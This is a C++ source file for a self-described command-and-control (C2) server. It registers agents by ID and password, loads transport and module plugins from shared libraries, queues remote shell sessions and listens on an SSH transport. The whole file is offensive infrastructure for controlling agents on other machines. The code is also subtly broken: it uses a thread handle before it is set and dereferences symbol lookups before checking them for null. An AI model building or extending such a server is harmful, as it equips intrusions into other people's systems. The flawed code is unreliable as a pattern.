#include "server.h"

/* Global variables and data structures */
Server *server;

/* Command-line argument handling information */
const char *argp_program_version = "C2 Server 0.1 Beta";
const char *argp_program_bug_address = "TheMissileKnowsWhereItIs@ItIsnt.com";
static char doc[] = "A simple Command and Control server";
static char args_doc[] = "";
static struct argp_option options[] = {
    {"register", 'r', "ID:PASS", 0, "Registers agent with `id` and `pass`"},
    0
};

static error_t parse_opt(int key, char *arg, struct argp_state *state){
    
    switch (key)
    {
    case 'r':
        AgentInformationHandler::register_agent(arg);
        exit(0);
        break;
    
    default:
        break;
    }
    return 0;
}

static struct argp argp = { options, parse_opt, args_doc, doc};


/* handy little print function for debugging pClientDat structures */
void print_clientDat(pClientDat str){
    printf("\n\nID: %s\n", str->id);
    printf("Type: %d\n\n\n", str->type);
}

/* Constructs a server object*/
Server::Server(){

    // initialize all of the vectors and queues needed 
    this->modules = new std::vector<class ServerModule *>(0);
    this->shell_queue = new std::queue<ConnectionInstance *>();
    this->logger = new Log();

    int ret;
    char* last;
	char result[4096];
    char dir[4096];
    unsigned long index;
    struct stat st = {0};
    
    
    memset(result, 0, sizeof(result));
	memset(dir, 0, sizeof(dir));
	
    // seed random number generator
    srand(time(NULL));

	// gets current file path, so data will be written to correct folder regardless of where execution is called
	readlink( "/proc/self/exe", result, 4096);

	last = strrchr(result, '/');
	index = last - result;
	strncpy(dir, result, index);
	
    // change to executable's home directory 
	ret = chdir(dir);
	if(ret < 0){
		perror("Failed to change directory");
		exit(-1);
	}

    // reset umask so we have full control of permissions
    umask(0);

    // initialize base directories
    if (stat("agents", &st) == -1) {
        mkdir("agents", 0755);
        printf("Server: initialized directory 'agents'\n");
    }

    if (stat("out", &st) == -1) {
        mkdir("out", 0755);
        printf("Server: initialized directory 'out'\n");
    }

    if (stat("agents/agents.dat", &st) == -1) {
        int fd2 = open("agents/agents.dat", O_RDWR | O_CREAT, S_IRUSR | S_IRGRP | S_IROTH);
        printf("Server: initialized agent authentication file\n");
        close(fd2);
    }
}

/* Starts a new listening thread using the `transport` backend on `port`*/
int Server::listen_instance(class ServerModule *module, int port){
    pthread_t thread;
    // pass connection to handler thread

    module->set_thread(thread);
    int *args = (int*)malloc(sizeof(int) * 3);
    args[0] = module->get_id();
    args[1] = port;
            
    // create thread
    if(pthread_create(&thread, NULL, init_instance, (void*)args)){
        printf("Error creating thread\n");
        return 1;
    }
    
    return 0;
}

/* Returns the queue of available remote shell sessions */
std::queue<ConnectionInstance *> *Server::get_shell_queue(){
    return this->shell_queue;
}
/* Returns vector of loaded modules */
std::vector<ServerModule *> *Server::get_modules(){
    return this->modules;
}

/* Adds a new module to the server */

void Server::add_module(void *handle){

    // check if the handle is not null
    if(!handle) {
        server->log("Broken handle found. Skipping...\n", "SERVER");
        return;
    }
    
    // get required global constants from the handle
    const int type = *(const int *)dlsym(handle, "type");
    const int id = *(const int *)dlsym(handle, "id");
    const char *name = *(const char **)dlsym(handle, "name");

    // check if they worked
    if(!type) {
        printf("[Loader] Failed to find type symbol\n");
        return;
    }
    else printf("[Loader] Detected object type '%d'\n", type);
    
    if (!id){
        printf("[Loader] Failed to locate the module's ID\n");
        return;
    }
    if (!name){
        printf("[Loader] Failed to locate the module's name\n");
        return;
    }
            

    ptransport_t *api = new ptransport_t;
    void (*entrypoint)();
    class ServerModule *module;

    // handle the different module types 
    switch(type){
        case MODULE:
            printf("[Loader] Detected module type\n");
            
            // resolve entrypoint and add it to the available module_handles vector 
            entrypoint = (void (*)())dlsym(handle, "entrypoint");
            if (!entrypoint){
                printf("[Loader] Failed to locate the module's entrypoint function");
                break;
            }

            module = new ServerModule(name, id, MODULE, handle, 
                                      entrypoint, nullptr);

            break;
        case TRANSPORT:
            printf("[Loader] Detected transport type\n");

            // resolve transport API and add it to available transport APIs
            *api = (ptransport_t)dlsym(handle, "transport_api");
            if(!api) {
                printf("[Loader] Failed to find transport API structure\n"); 
                break;
            }
            
            module = new ServerModule(name, id, TRANSPORT, handle, 
                                      nullptr, api);
            break;

        default:
            // unknown module type
            printf("[Loader] Unknown type: %d\n", type);
            break;
    }


     

    this->modules->push_back(module);

}

/* Reloads all available modules */
void Server::reload_backends(){
    DIR *dir;
    struct dirent *ent;
    char *buff = (char*)malloc(2048);

    // clear the current vectors
    
    // close all currently open dl handles 
    for(ServerModule *module : *(this->modules)){
        module->close_handle();
        delete module;
    }
    this->modules->clear();

    // open modules directory 
    if ((dir = opendir ("shared/")) != NULL) {

        // loop over each module
        while ((ent = readdir (dir)) != NULL) {

            // ignore current and parent dir entries 
            if(!strcmp(ent->d_name, ".") || !strcmp(ent->d_name, "..")){
                continue;
            } else {

                // get module path
                memset(buff, 0, 2048);
                sprintf(buff, "./shared/%s", ent->d_name);
                
                // open the module and handle the instance
                void *handle = dlopen(buff, RTLD_NOW);
                if(!handle) {
                    printf("Failed to load .so file: %s\n", dlerror());    
                    continue;
                }

                this->add_module(handle);
                printf("Added module to server\n");
            }
        }
    } else {
        // Failed to open directory 
        printf("[Loader] Failed to open target directory 'shared/'\n");
        perror ("");
    }

    // close handle and return
    closedir (dir);
    return;
}

/* Returns the stored ServerModule with the ID `id` */
class ServerModule *Server::get_module_from_id(int id){
    for(ServerModule* module : *(this->get_modules())){
        if(module->get_id() == id){
            return module;
        }
    }

    return nullptr;
}

/* Thread worker which initializes a listening backend or module */
void *init_instance(void *args){

    // get arguments from passed generic data
    int *passed_args = (int*)args;
    int transport_id = passed_args[0];
    int port = passed_args[1];
    bool found = false;
    bool is_module = false;
    
    class ConnectionInstance *instance = new ConnectionInstance();
    std::vector<ServerModule*> *modules = server->get_modules();

    ServerModule *mod;
    // loop over all available transport API handles

    for(ServerModule *module : *modules){
        if (module->get_id() == transport_id){
            mod = module;
            found = true;
            if(module->get_type() == TRANSPORT){
                instance->set_transport(*(module->get_transport()));
            } else {
                is_module = true;
            }
        }
    }

    
    // Check if we found the target API
    if(!found){
        printf("[Loader] Could not find transport with corresponding ID '%d'\n", transport_id);
        return nullptr;

        // check if we loaded a module
    } else if (is_module){
        printf("[Loader] module run\n");
        ((void (*)())mod->get_entrypoint())();
    } else {
        // initialize the transport's instance data
        if(!instance->api_check(instance->get_transport()->get_dat_siz())){
            return nullptr;
        }
        void *data = malloc((int)instance->api_data);
        memset(data, 0, (int)instance->api_data);

        //instance->init_data(&data);
        instance->get_transport()->init(data);

        // sets the listening port of the transport
        instance->get_transport()->set_port(data, port);

        // last minute assignments and connection handoff to instance
        instance->set_server(server);
        instance->set_data(data);


        //printf("[Loader] Transport ptr: %p\n", instance->get_transport());
        instance->handle_connection();
    }
    return nullptr;
}

/*Funny enough, this is the main function*/
int main(int argc, char **argv){

    // parse CLI arguments
    // /struct arguments arguments;

    argp_parse(&argp, argc, argv, 0, 0, 0);



    // initialize variables
    server = new Server();

    // load all available backends and modules
    server->reload_backends();
        
    // listen on an SSH Transport instance on the default port 
    server->listen_instance(server->get_module_from_id(55), 0);
    
    // Do nothing...
    while(1){
        sleep(1);
    }
    
    printf("Server: Terminated successfully\n");
    return 0;
}

